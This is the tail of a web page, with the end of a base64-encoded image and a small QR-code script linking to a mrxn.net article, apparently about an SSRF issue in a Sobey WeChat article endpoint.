kjP8LrPeToVF6obe8hfcruqeuQKUOw+53bRzzzzUH6d269qD8ipNaMOGbGa0h+1I6uz/pYA8f9VvXqhdcrxFN8E9zeQ9xPTamWHDJtCJY3Lohu/qcIz/WB5CA47qVfQzLuqftyfRFSt/LNPYuQfuYf9b1eIZ7Sm+D2HgLzFN1fnyYkB0FzHSE+BO0D4RBUt77zrq98c4Vw3Lu8WhAfgqueMPsQXj2OFhz7vT/MOQgHrr+H3N7sa/efLPiaFrBt1ymvcAsuLoDpX17tY7zzM10f0hdQ2iFweO9+zxWH1HffG8Hs9xzENy/CXt8NxPCFrzmB3acst9GnrA7zVGHm5qxfIaQOgtbBzNVFWPuw9qwvhDkHM3fPt1ulvxbMuS8nVxAfZoz79b33lxder5Cvc3qLq+1TVk1nXKvdmVn5kKdDH8IhqN77QPyum4f4cnNHaAZSYwaOuXkRkpOL9hHVRfWO+pC+EFQf8XqFjKfxBtfbewhkavAc9r1D6nw6uv8sh/QxD+GrvhAfsGTDsxp9cSs8uQDun9pWdRD/pM3ud//A9feQ25t9bf/Jctpn2Pff8/Dc02GfXi/vvryj+cLudV6ZccG8V5i59dasuLrY8+pi9+WF20AMX/jaE9gNBPKUwIyrbcJzuZp+LftA6uQiHOv6IiQHezzL6K+w9lkL5t7m4TkdkrOuetaSw+yXvhtIidd63Qn8s4HU5Gv5o0CmX1qtlQ7J6Ve2lnyFlemrZ7svNyeH7GHFzUNycvNyUV1Uh9RDUB/CgetT1u3Nvn79CnHK/lxyETL97kN0c/orhDkP4fCF1n63p3WQXnLRfh31VwiP+x3V/XogR00v7ecnsBtIfwrkZ7eA+WmAx3zVD1LnfSG85/WPsGc7h+OePdc5pA6C+n0PEL/rcogPQfsU7gZS4rVedwLbQCDTgse42mqf/iqn3vOQ+6qbO0NIHXzhWY1+v1fn5iC99UV9EeYchK/8oz7bQCy68LUncA3ktee/u/v/AAAA//8UfwzaAAAABklEQVQDAAGyy6eouB67AAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-WXArticleInt-wxArticleInfo-SSRF.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 